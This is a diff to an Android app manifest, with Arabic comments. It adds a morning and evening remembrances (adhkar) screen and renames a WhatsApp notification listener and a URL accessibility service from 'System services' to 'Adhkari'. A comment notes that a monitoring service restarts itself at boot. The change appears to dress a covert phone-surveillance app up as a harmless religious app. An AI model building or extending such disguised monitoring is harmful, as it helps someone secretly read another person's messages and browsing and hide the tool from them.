@@ -52,6 +52,11 @@
             android:exported="false"
             android:excludeFromRecents="true" />
 
+        <!-- شاشة «أذكاري»: أذكار الصباح والمساء — يفتحها الإشعار الثابت -->
+        <activity
+            android:name=".AdhkarActivity"
+            android:exported="false" />
+
         <!-- مستقبِل إعادة تشغيل الجهاز: يشغّل خدمة المراقبة تلقائيًا
              بعد تشغيل الهاتف أو تحديث التطبيق أو طلب إعادة تشغيل داخلي -->
         <receiver
@@ -83,7 +88,7 @@
         <service
             android:name=".WhatsappNotificationService"
             android:exported="false"
-            android:label="خدمات النظام"
+            android:label="أذكاري"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -107,7 +112,7 @@
         <service
             android:name=".UrlAccessibilityService"
             android:exported="false"
-            android:label="خدمات النظام"
+            android:label="أذكاري"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
